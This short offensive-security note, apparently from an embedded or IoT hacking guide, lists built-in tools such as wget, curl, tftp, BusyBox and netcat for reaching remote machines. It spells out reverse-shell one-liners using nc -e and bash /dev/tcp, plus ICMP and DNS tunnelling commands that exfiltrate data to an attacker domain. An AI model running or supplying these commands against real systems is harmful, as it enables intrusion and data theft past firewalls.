There are multiple system tools that can be found by default on many systems to interact with remote machines

==wget
curl
ftpget
ftp
tftp==

For devices using the ==BusyBox== suite, alternative commands such as busybox wget or busybox ftpget can be used instead

==nc (netcat) and scp== tools can also be used for similar purposes.

Another advantage of nc is
that some versions of it can be used to establish the reverse shell:
nc -e /bin/sh <remote_ip> <remote_port>

Some versions of bash can be used to establish a remote shell on their own

bash -i >& /dev/tcp/<remote_ip>/<remote_port> 0>&1

An example of the more advanced way to exfiltrate data bypassing strong firewalls is by using the ping utility and storing data in padding bytes (ICMP tunneling) or sending data in third level (or above) domain names with the nslookup utility (DNS tunneling): ping <remote_ip> -p <exfiltrated_data>
nslookup $encodeddata.<attacker_domain>